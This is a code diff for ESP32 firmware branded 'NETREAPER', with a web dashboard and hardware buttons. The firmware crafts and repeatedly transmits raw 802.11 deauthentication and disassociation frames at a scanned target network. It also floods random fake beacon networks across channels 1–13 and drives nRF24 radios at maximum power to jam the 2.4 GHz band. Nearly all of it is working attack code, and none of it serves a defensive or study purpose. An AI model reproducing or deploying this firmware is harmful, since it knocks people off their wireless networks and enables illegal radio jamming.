@@ -152,4 +152,349 @@ void startWiFiScan() {
       memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
       scannedNetworks[i].channel = WiFi.channel(i);
       scannedNetworks[i].rssi = WiFi.RSSI(i);
-      networkListHTML += "<tr><td>[" + String(i) + "]</td><td>" + scannedNetworks[i].ssid + "</td><td>Ch: " + String(scannedNetworks[i].channel) + "</td
+      networkListHTML += "<tr><td>[" + String(i) + "]</td><td>" + scannedNetworks[i].ssid + "</td><td>Ch: " + String(scannedNetworks[i].channel) + "</td><td><a href='/deauth?idx=" + String(i) + "' class='btn-attack'>ATTACK</a></td></tr>";
+    }
+  } else { networkListHTML = "<tr><td colspan='4'>No networks found!</td></tr>"; }
+  scanExecuted = true;
+}
+
+void startDeauth(int index) {
+  if (index < 0 || index >= networkCount) return;
+  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
+  targetChannel = scannedNetworks[index].channel;
+  targetSSID = scannedNetworks[index].ssid;
+
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_max_tx_power(84);
+  WiFi.mode(WIFI_AP_STA); delay(100);
+  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  seqNum = 0;
+
+  Serial.printf("[*] MAX AGGRESSIVE Deauth Started on '%s' (Channel: %d)\n", targetSSID.c_str(), targetChannel);
+  digitalWrite(deauthLedPin, HIGH); isDeauthing = true;
+}
+
+void sendDeauth() {
+  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  uint8_t deauth[26];
+  uint8_t disassoc[26];
+  
+  deauth[0] = 0xC0; disassoc[0] = 0xA0; 
+  deauth[1] = disassoc[1] = 0x00;
+  deauth[2] = disassoc[2] = 0x00;
+  
+  const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+  memcpy(&deauth[4], bcast, 6); memcpy(&disassoc[4], bcast, 6);
+  memcpy(&deauth[10], targetBSSID, 6); memcpy(&deauth[16], targetBSSID, 6); 
+  memcpy(&disassoc[10], targetBSSID, 6); memcpy(&disassoc[16], targetBSSID, 6);
+
+  deauth[24] = 0x07; deauth[25] = 0x00;
+  disassoc[24] = 0x02; disassoc[25] = 0x00;
+
+  deauth[22] = seqNum & 0xFF; deauth[23] = (seqNum >> 8) & 0xFF;
+  disassoc[22] = (seqNum + 1) & 0xFF; disassoc[23] = ((seqNum + 1) >> 8) & 0xFF;
+  seqNum += 2;
+
+  for (int i = 0; i < 15; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth, 26, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, disassoc, 26, false);
+  }
+}
+
+void stopDeauth() { 
+  isDeauthing = false; targetSSID = ""; 
+  esp_wifi_set_promiscuous(false);
+  digitalWrite(deauthLedPin, LOW); 
+  WiFi.mode(WIFI_AP); // Restore AP mode cleanly
+  Serial.println("[*] Deauth Stopped!");
+}
+
+void checkDeauthButton() {
+  static int lastState = HIGH; static unsigned long lastTime = 0;
+  int currentState = digitalRead(deauthButtonPin);
+  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
+    lastTime = millis();
+    if (!isDeauthing) {
+      if (isJamming) { stopJamming(); isJamming = false; }
+      if (isBeaconing) stopBeaconFlood();
+      
+      WiFi.mode(WIFI_OFF); delay(200); 
+      WiFi.mode(WIFI_AP); delay(100);
+      
+      if (!scanExecuted) { startWiFiScan(); if(networkCount>0) startDeauth(0); } 
+      else { startDeauth(0); }
+    } else { stopDeauth(); }
+  }
+  lastState = currentState;
+}
+
+// ================= BEACON FLOOD FUNCTIONS =================
+void startBeaconFlood() {
+  if (isJamming) { isJamming = false; stopJamming(); }
+  if (isDeauthing) stopDeauth();
+  
+  isBeaconing = true;
+  Serial.println("[*] INFINITE RAJDEEP BEACON FLOOD ACTIVATED");
+  digitalWrite(rfLedPin, HIGH);
+  digitalWrite(deauthLedPin, HIGH);
+  
+  esp_wifi_set_max_tx_power(84);
+  WiFi.mode(WIFI_AP);
+  delay(100);
+  esp_wifi_set_promiscuous(true);
+  currentBeaconChannel = 1;
+}
+
+void stopBeaconFlood() {
+  isBeaconing = false;
+  Serial.println("[*] BEACON FLOOD DEACTIVATED");
+  digitalWrite(rfLedPin, LOW);
+  digitalWrite(deauthLedPin, LOW);
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_AP); // Crucial: Restores the Web Server Wi-Fi
+  delay(100);
+}
+
+void sendBeacon(int channel) {
+  uint8_t bssid[6];
+  for(int i=0; i<6; i++) bssid[i] = esp_random() % 256;
+  bssid[0] &= 0xFE; 
+
+  char currentSSID[32];
+  snprintf(currentSSID, sizeof(currentSSID), "rajdeep_%04d", (esp_random() % 9000) + 1000);
+  int ssidLen = strlen(currentSSID);
+
+  beaconPacket[0] = 0x80; beaconPacket[1] = 0x00;
+  beaconPacket[2] = 0x00; beaconPacket[3] = 0x00;
+  memset(&beaconPacket[4], 0xFF, 6);
+  memcpy(&beaconPacket[10], bssid, 6);
+  memcpy(&beaconPacket[16], bssid, 6);
+  beaconPacket[22] = esp_random() % 256;
+  beaconPacket[23] = (esp_random() % 256) & 0xF0; 
+
+  uint64_t ts = esp_timer_get_time();
+  memcpy(&beaconPacket[24], &ts, 8);
+  beaconPacket[32] = 0x64; beaconPacket[33] = 0x00;
+  beaconPacket[34] = 0x11; beaconPacket[35] = 0x04;
+
+  int offset = 36;
+
+  beaconPacket[offset++] = 0x00; 
+  beaconPacket[offset++] = ssidLen; 
+  memcpy(&beaconPacket[offset], currentSSID, ssidLen);
+  offset += ssidLen;
+
+  beaconPacket[offset++] = 0x01; beaconPacket[offset++] = 0x0C; 
+  beaconPacket[offset++] = 0x82; beaconPacket[offset++] = 0x84; beaconPacket[offset++] = 0x8B; beaconPacket[offset++] = 0x96; 
+  beaconPacket[offset++] = 0x0C; beaconPacket[offset++] = 0x12; beaconPacket[offset++] = 0x18; beaconPacket[offset++] = 0x24; 
+  beaconPacket[offset++] = 0x30; beaconPacket[offset++] = 0x48; beaconPacket[offset++] = 0x60; beaconPacket[offset++] = 0x6C; 
+
+  beaconPacket[offset++] = 0x03; beaconPacket[offset++] = 0x01; beaconPacket[offset++] = channel; 
+
+  beaconPacket[offset++] = 0x2A; beaconPacket[offset++] = 0x01; beaconPacket[offset++] = 0x00; 
+
+  beaconPacket[offset++] = 0x32; beaconPacket[offset++] = 0x04; 
+  beaconPacket[offset++] = 0x6C; beaconPacket[offset++] = 0x6C; beaconPacket[offset++] = 0x6C; beaconPacket[offset++] = 0x6C; 
+
+  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, offset, false);
+}
+
+void checkBeaconButton() {
+  static bool lastRfState = HIGH;
+  static bool lastDeauthState = HIGH;
+  static unsigned long lastTime = 0;
+  
+  int rfState = digitalRead(rfButtonPin);
+  int deauthState = digitalRead(deauthButtonPin);
+  
+  if (rfState == LOW && deauthState == LOW) {
+    if (lastRfState == HIGH && lastDeauthState == HIGH && (millis() - lastTime > 500)) {
+      lastTime = millis();
+      if (!isBeaconing) startBeaconFlood();
+      else stopBeaconFlood();
+    }
+  } 
+  else if (isBeaconing && (rfState == LOW || deauthState == LOW)) {
+    if ((lastRfState == HIGH || lastDeauthState == HIGH) && (millis() - lastTime > 300)) {
+      lastTime = millis();
+      stopBeaconFlood();
+    }
+  }
+  
+  lastRfState = rfState;
+  lastDeauthState = deauthState;
+}
+
+// ================= WEB SERVER ROUTES =================
+void handleRoot() {
+  String statusText = "SYSTEM IDLE - READY";
+  String statusColor = "#00ff00";
+  String statusDetails = "";
+
+  if (isJamming) {
+    statusText = "BT-BAND RF JAMMING ACTIVE";
+    statusColor = "#ffaa00";
+    statusDetails = "<p style='color:#fff;'>WiFi Radio disabled. Press GPIO 4 to stop.</p>";
+  } else if (isDeauthing) { 
+    statusText = "MAX AGGRESSIVE DEAUTH ACTIVE";
+    statusColor = "#ff0000";
+    char bssidStr[18];
+    sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
+    statusDetails = "<div style='background:#330000; padding:10px; border-radius:5px; border:1px solid #ff0000;'>";
+    statusDetails += "<p style='color:#fff;'>Target: <b style='color:#ff5555;'>" + targetSSID + "</b> | Ch: <b>" + String(targetChannel) + "</b></p>";
+    statusDetails += "<p style='color:#aaa; font-size:13px;'>BSSID: " + String(bssidStr) + "</p></div>";
+  } else if (isBeaconing) {
+    statusText = "INFINITE RAJDEEP BEACON FLOOD";
+    statusColor = "#00ffff";
+    statusDetails = "<p style='color:#fff;'>Generating unlimited 'rajdeep_XXXX' networks across Ch 1-13.</p>";
+  }
+
+  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><meta http-equiv='refresh' content='3'>";
+  html += "<style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;text-align:center;padding:15px;}";
+  html += "h1{color:#ff3333;text-shadow:0 0 10px #ff0000;} .status-box{background:#1a1a1a; border:2px solid " + statusColor + "; padding:20px; border-radius:10px; margin-bottom:20px;}";
+  html += ".status-title{font-size:1.5em; color:" + statusColor + "; font-weight:bold;} .btn{display:inline-block;width:42%;margin:4px;padding:12px;font-size:15px;color:#fff;background:#222;border:2px solid #00ff00;text-decoration:none;border-radius:8px;}";
+  html += ".btn-full{display:block;width:90%;margin:10px auto;padding:15px;font-size:18px;color:#fff;background:#222;border:2px solid #00ff00;text-decoration:none;border-radius:8px;}";
+  html += ".btn-attack{background:#ff0000;color:#fff;padding:8px 15px;text-decoration:none;border-radius:5px;} .btn-stop{background:#330000;border-color:#ff3333;color:#ff3333;} .btn-unlimited{border-color:#ffaa00;color:#ffaa00;} .btn-beacon{border-color:#00ffff;color:#00ffff;}";
+  html += "#countdown{font-size:2.5em;color:#ff3333;margin:20px 0;display:none;} table{width:100%;border-collapse:collapse;margin-top:15px;} th,td{border:1px solid #333;padding:10px;} th{color:#00ff00;} td{color:#ccc;}</style></head><body>";
+  html += "<h1>NETREAPER DASHBOARD</h1><div class='status-box'><div class='status-title'>" + statusText + "</div>" + statusDetails + "</div>";
+  
+  html += "<a href='/scan' class='btn-full'>SCAN NETWORKS</a>";
+  if (isDeauthing) html += "<a href='/deauth?idx=stop' class='btn-full btn-stop'>STOP DEAUTH ATTACK</a>";
+  
+  if (isBeaconing) {
+    html += "<a href='/beacon?action=stop' class='btn-full btn-stop'>STOP BEACON BLAST</a>";
+  } else {
+    html += "<a href='/beacon?action=start' class='btn-full btn-beacon'>START BEACON BLAST (Rajdeep Flood)</a>";
+  }
+
+  html += "<h3 style='color:#fff;'>BT-BAND RF JAMMER:</h3><div>";
+  html += "<a href='#' class='btn' onclick='startJam(10)'>10s</a><a href='#' class='btn' onclick='startJam(30)'>30s</a>";
+  html += "<a href='#' class='btn btn-unlimited' onclick='startJam(0)'>UNLIMITED</a></div><div id='countdown'></div>";
+  html += "<h3 style='color:#fff;'>Targets:</h3><table><tr><th>ID</th><th>SSID</th><th>Ch</th><th>Action</th></tr>" + networkListHTML + "</table>";
+  html += "<p style='color:#666; font-size:12px; margin-top:20px;'>Physical Tip: Press GPIO 4 + 5 together to toggle Beacon</p>";
+  html += "<script>function startJam(s){fetch('/rf?time='+s);const d=document.getElementById('countdown');d.style.display='block';if(s==0){d.innerText='JAMMING (GPIO 4 to stop)';}else{let t=s;d.innerText='JAMMING '+t+'s';const i=setInterval(()=>{t--;if(t<=0){clearInterval(i);d.innerText='RECONNECTING...';setTimeout(()=>location.reload(),1500);}else{d.innerText='JAMMING '+t+'s';}},1000);}}</script></body></html>";
+  server.send(200, "text/html", html);
+}
+
+void handleScan() { if (isJamming) stopJamming(); if(isBeaconing) stopBeaconFlood(); startWiFiScan(); server.sendHeader("Location", "/", true); server.send(302); }
+void handleDeauth() { String idxStr = server.arg("idx"); if (idxStr == "stop") stopDeauth(); else { int idx = idxStr.toInt(); if (isJamming) { stopJamming(); isJamming = false; } if(isBeaconing) stopBeaconFlood(); startDeauth(idx); } server.sendHeader("Location", "/", true); server.send(302); }
+
+void handleBeacon() { 
+  String action = server.arg("action"); 
+  if (action == "start") {
+    startBeaconFlood();
+  } else {
+    stopBeaconFlood();
+  }
+  server.sendHeader("Location", "/", true); 
+  server.send(302); 
+}
+
+void handleRFToggle() { 
+  String timeStr = server.arg("time"); int seconds = timeStr.toInt(); 
+  if (seconds >= 0) { 
+    if (isDeauthing) stopDeauth(); 
+    if (isBeaconing) stopBeaconFlood();
+    isJamming = true; startJamming(); 
+    if (seconds > 0) { isWebRfJamming = true; currentWebJamDuration = seconds * 1000; rfJamStartTime = millis(); } 
+    else { isWebRfJamming = false; } 
+  } 
+  server.send(200, "text/plain", "OK"); 
+}
+
+void handleSerial() {
+  if (Serial.available()) {
+    String command = Serial.readStringUntil('\n'); command.trim();
+    if (command.equalsIgnoreCase("scan")) { if(isJamming) stopJamming(); if(isBeaconing) stopBeaconFlood(); startWiFiScan(); }
+    else if (command.startsWith("deauth ")) { String arg = command.substring(7); if (arg == "off") stopDeauth(); else { if(isJamming) stopJamming(); if(isBeaconing) stopBeaconFlood(); startDeauth(arg.toInt()); } }
+    else if (command.equalsIgnoreCase("rf")) { toggleJammerPhysical(); }
+    else if (command.equalsIgnoreCase("rf off")) { if(isJamming) { isJamming=false; stopJamming(); } }
+    else if (command.equalsIgnoreCase("beacon")) { 
+        if(isBeaconing) stopBeaconFlood();
+        else startBeaconFlood();
+    }
+  }
+}
+
+// ================= INITIALIZATION =================
+void initSP() {
+  sp = new SPIClass(VSPI);
+  sp->begin(18, 19, 23, 21); 
+  if (radio1.begin(sp)) {
+    radio1.setAutoAck(false); radio1.stopListening(); radio1.setRetries(0, 0); 
+    radio1.setPALevel(RF24_PA_MAX, true); radio1.setDataRate(RF24_2MBPS);       
+    radio1.setCRCLength(RF24_CRC_DISABLED); radio1.powerDown(); 
+  }
+}
+
+void initHP() {
+  hp = new SPIClass(HSPI);
+  hp->begin(14, 12, 13, 15); 
+  if (radio.begin(hp)) {
+    radio.setAutoAck(false); radio.stopListening(); radio.setRetries(0, 0); 
+    radio.setPALevel(RF24_PA_MAX, true); radio.setDataRate(RF24_2MBPS);       
+    radio.setCRCLength(RF24_CRC_DISABLED); radio.powerDown(); 
+  }
+}
+
+void setup() {
+  Serial.begin(115200); delay(1000); setCpuFrequencyMhz(240);
+  pinMode(rfButtonPin, INPUT_PULLUP); pinMode(rfLedPin, OUTPUT); digitalWrite(rfLedPin, LOW);
+  pinMode(deauthButtonPin, INPUT_PULLUP); pinMode(deauthLedPin, OUTPUT); digitalWrite(deauthLedPin, LOW);
+
+  esp_wifi_set_max_tx_power(84); 
+  initHP(); initSP(); 
+  
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(apSSID, apPassword);
+  Serial.print("Connect to: "); Serial.println(apSSID);
+  Serial.print("IP: "); Serial.println(WiFi.softAPIP());
+
+  server.on("/", handleRoot);
+  server.on("/scan", handleScan);
+  server.on("/deauth", handleDeauth); 
+  server.on("/beacon", handleBeacon); 
+  server.on("/rf", handleRFToggle);
+  server.begin();
+  
+  Serial.println("[*] System Ready. Web Dashboard & Physical Buttons Active.");
+}
+
+// ================= MAIN LOOP =================
+void loop() {
+  checkBeaconButton();
+  server.handleClient();
+  handleSerial();
+
+  if (isBeaconing) {
+    esp_wifi_set_channel(currentBeaconChannel, WIFI_SECOND_CHAN_NONE);
+    for (int i = 0; i < 15; i++) {
+      sendBeacon(currentBeaconChannel);
+      delay(2); 
+    }
+    currentBeaconChannel++;
+    if (currentBeaconChannel > 13) {
+      currentBeaconChannel = 1;
+    }
+    yield();
+  } 
+  else if (isJamming) {
+    checkJammerButton();
+    if (isWebRfJamming && (millis() - rfJamStartTime >= currentWebJamDuration)) {
+      isJamming = false;
+      stopJamming();
+    } else {
+      aggressiveRandomMode();
+    }
+  } 
+  else {
+    checkJammerButton(); 
+    checkDeauthButton(); 
+
+    if (isDeauthing) { 
+      sendDeauth(); 
+      delay(5); 
+      yield(); 
+    }
+  }
+}
